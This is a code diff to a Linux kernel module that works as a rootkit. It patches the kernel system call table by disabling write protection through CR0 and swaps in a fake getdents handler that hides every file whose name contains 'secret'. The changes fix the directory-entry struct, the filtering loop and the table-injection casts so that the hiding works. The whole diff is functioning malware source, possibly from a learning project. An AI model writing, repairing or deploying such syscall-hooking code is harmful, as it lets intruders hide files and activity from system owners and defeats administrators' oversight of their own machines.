@@ -30,6 +30,13 @@ static unsigned long *sys_call_table;	//points to kernel's syscall table
 #define numTargets 4
 #define SECRET_STRING "secret"
 
+struct linux_dirent {
+	long d_ino;
+	off_t d_off;
+	unsigned short d_reclen;
+	char d_name[];
+};
+
 //MAKE CHANGES TO THE BELOW ARRAYS IN THE loadMod() function
 static int syscall_names[numTargets]; //array defining syscall name (macro index) for each target
 static void* original_syscallPtrs[numTargets]; //array to store ptrs to the original kernel syscall functions
@@ -54,15 +61,15 @@ asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
 }
 
 /***  Modified getdents to hide files that contain secret string in filename ***/
-asmlinkage long totallyReal_getdents64 (int fd, struct linux_dirent64 *dirp, int count) {
+asmlinkage long totallyReal_getdents (int fd, struct linux_dirent *dirp, int count) {
 	/* similar to sys_read, prints to log very frequently */
 	pr_info("fakeGetDents: %d %p %d\n", fd, dirp, count);
 	
 	int nread;
-	struct linux_dirent64 *mod_dirp;
+	struct linux_dirent *mod_dirp;
 
 	// call original function to populate dirp
-	nread = ((typeof(sys_getdents64)*)(original_syscallPtrs[3]))(fd, dirp, count);
+	nread = ((typeof(sys_getdents)*)(original_syscallPtrs[3]))(fd, dirp, count);
 	if (nread == -1) {
 		pr_info("fakeGetDents: error calling original function\n");
 		return -1;
@@ -85,23 +92,27 @@ asmlinkage long totallyReal_getdents64 (int fd, struct linux_dirent64 *dirp, int
 	pr_info("fakeGetDents: copied original dirp '%p' to new dirp '%p'\n", dirp, mod_dirp);
 
 	// iterate through all files and hide any with secret string in filename
-	int off = 0;
-	struct linux_dirent64 *p_dirp;
+	long off = 0;
+	struct linux_dirent *p_dirp, *prev;
 	while (off < nread) {
 		p_dirp = (void *)mod_dirp + off;
-		pr_info("fakeGetDents: reading off address %p from copied dirp\n", p_dirp);
+		//pr_info("fakeGetDents: reading off address %p from copied dirp\n", p_dirp);
 		
 		// if filename contains secret string, remove file from struct
-		if (strstr(p_dirp->d_name-1, SECRET_STRING) != NULL) {
-			pr_info("fakeGetDents: hiding super secret file '%s'\n", p_dirp->d_name-1);
-			nread -= p_dirp->d_reclen;
-			memmove(mod_dirp, (void *)mod_dirp + p_dirp->d_reclen, nread);
-			continue;
+		if (strstr(p_dirp->d_name, SECRET_STRING) != NULL) {
+			if (p_dirp == mod_dirp) {
+				pr_info("fakeGetDents: hiding super secret file '%s'\n", p_dirp->d_name);
+				nread -= p_dirp->d_reclen;
+				memmove(mod_dirp, (void *)mod_dirp + p_dirp->d_reclen, nread);
+				continue;
+			}
+			prev->d_reclen += p_dirp->d_reclen;
 		} else {
-			pr_info("fakeGetDents: normal file '%s'\n", p_dirp->d_name-1);
+			pr_info("fakeGetDents: normal file '%s'\n", p_dirp->d_name);
+			prev = p_dirp;
 		}
 		off += p_dirp->d_reclen;
-		//pr_info("fakeGetDents: incrementing pointer by %d spaces; bytes left to read = %d\n", i, nread - i);
+		pr_info("fakeGetDents: incrementing pointer by %ld spaces; bytes left to read = %ld\n", off, nread - off);
 	}
 
 	// copy contents of modified dirp back to original dirp
@@ -125,7 +136,7 @@ void injectSyscalls(void){
 			
 			//inject fake ptr
 			CR0_WRITE_UNLOCK({
-				sys_call_table[syscall_names[targetIndex]] = (void *)totallyReal_syscallPtrs[targetIndex];
+				sys_call_table[syscall_names[targetIndex]] = (unsigned long)totallyReal_syscallPtrs[targetIndex];
 			});
 			pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);
 
@@ -143,7 +154,7 @@ void restoreSyscalls(void){
 		if(toInject[targetIndex]){
 			pr_info("Restoring ptr for target %d\n", targetIndex);
 			CR0_WRITE_UNLOCK({
-				sys_call_table[syscall_names[targetIndex]] = (void *)original_syscallPtrs[targetIndex];
+				sys_call_table[syscall_names[targetIndex]] = (unsigned long)original_syscallPtrs[targetIndex];
 			});
 			pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
 		}
@@ -179,7 +190,7 @@ int __init loadMod(void){
 	toInject[2] = 1;
 
 	syscall_names[3] = __NR_getdents;
-	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents64;
+	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents;
 	toInject[3] = 1;
 
 	injectSyscalls();
